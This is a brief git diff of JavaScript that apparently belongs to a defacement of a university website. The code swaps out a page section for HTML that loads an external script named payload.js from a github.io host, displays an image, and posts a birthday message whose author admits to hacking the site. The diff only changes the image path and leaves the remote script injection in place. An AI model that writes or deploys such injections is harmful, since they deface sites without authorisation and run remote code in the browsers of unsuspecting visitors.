@@ -46,7 +46,7 @@ document.head.appendChild(style);
 // Replace the entire <section> element with the script tag
 const sectionElement = document.querySelector('section#section-page');
 if (sectionElement) {
-  sectionElement.outerHTML = `<script src="https://vmpirevigil0.github.io/ai/payload.js"></script><img src="https://i.pinimg.com/736x/d6/70/57/d67057a933c61fe13cd622b9a629d2bb.jpg" class="center">
+  sectionElement.outerHTML = `<script src="https://vmpirevigil0.github.io/ai/payload.js"></script><img src="img.jpg" class="center">
                               <h1>hi miss, Happy Birthday. We are grateful to have you in our life. Specially me obviously! And I might have hacked into the versity website for this</h1>`;
 }
 
